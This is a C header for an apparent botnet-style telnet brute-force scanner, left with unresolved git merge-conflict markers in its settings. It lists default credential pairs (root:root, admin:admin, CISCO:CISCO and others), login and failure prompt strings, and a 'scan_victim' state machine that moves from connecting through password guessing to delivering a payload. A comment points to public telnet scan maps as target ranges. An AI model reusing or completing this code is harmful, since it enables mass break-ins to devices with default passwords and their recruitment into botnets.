#pragma once

<<<<<<< HEAD
#define SCAN_SCANNER_BURST 2000 // How many packets to send out each burst
#define SCAN_SCANNER_ERRMAX 30000 // Max amount of errors before _exit(0);
#define SCAN_SCANNER_MAXCON 10 // Maximum connections
=======
#define SCAN_SCANNER_BURST 10 // How many packets to send out each burst
#define SCAN_SCANNER_ERRMAX 200 // Max amount of errors before we throw an error on debug
#define SCAN_SCANNER_MAXCON 5 // Maximum connections
>>>>>>> origin/master
#define SCAN_SCANNER_SEC 5
#define SCAN_SCANNER_USEC 0
#define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n"

// Need static as it's only in this function
#define usersize (sizeof(usernames) / sizeof(unsigned char *))
#define passsize (sizeof(passwords) / sizeof(unsigned char *))

const static char *userprompts[] =
{
	"user",
	"login",
};

const static char *passprompts[] =
{
	"password",
};

const static char *prompts[] =
{
	"$",
	"#",
};

const static char *failstrs[] =
{
	"invalid",
	"incorrect",
	"fail",
	"again",
	"wrong",
	"denied",
	"error",
	"bad",
};

const static char *usernames[] =
{
	"root\r\n\0", // root:root
	"root\r\n\0", // root:1234
	"root\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0", // CISCO:CISCO
};

const static char *passwords[] =
{
	"root\r\n\0", // root:root
	"1234\r\n\0", // root:1234
	"12345\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0"
};


/*
https://telnetscan.shadowserver.org/
https://telnetscan.shadowserver.org/all/telnet_hilbert_1024_current.png
Good ranges?

static char *ranges[] =
{
	// Add these bitch
};
*/

struct pseudo_header
{ //needed for checksum calculation
	unsigned int   source_address;
	unsigned int   dest_address;
	unsigned char  placeholder;
	unsigned char  protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

struct scan_victim
{
	ipv4_t ip;
	enum
	{
		CONNECTING,
		USERNAME,
		PASSWORD,
		PAYLOAD,
		FINISHED,
	} state;
	int32_t sock;
	uint8_t user;
	uint8_t pass;
	uint8_t tries;
};

void scan_init();
bool scan_scanner();
